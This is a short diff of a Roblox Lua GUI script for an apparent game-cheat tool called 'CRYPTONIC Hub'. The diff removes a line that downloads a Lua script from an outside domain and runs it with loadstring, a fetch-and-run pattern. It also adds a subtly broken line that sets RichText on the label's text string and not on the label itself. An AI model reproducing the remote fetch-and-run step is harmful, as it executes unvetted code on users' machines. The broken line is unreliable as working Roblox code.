@@ -335,6 +335,7 @@ TextLabel.Position = UDim2.new(-0.0554185919, 0, 0, 0)
 TextLabel.Size = UDim2.new(0, 187, 0, 24)
 TextLabel.Font = Enum.Font.SourceSansBold
 TextLabel.Text = "CRYPTONIC <font color=\"#FFA500\">Hub</font>"
+TextLabel.Text.RichText = true
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextScaled = true
 TextLabel.TextSize = 14.000
@@ -1048,8 +1049,6 @@ local function QZRH_fake_script() -- push.LocalScript
 					end
 				end
 			end
-			print("sure")
-			loadstring(game:HttpGet("https://mininosasesinos.ml/antiragdoll.lua"))();
 		end)
 	end)
 end
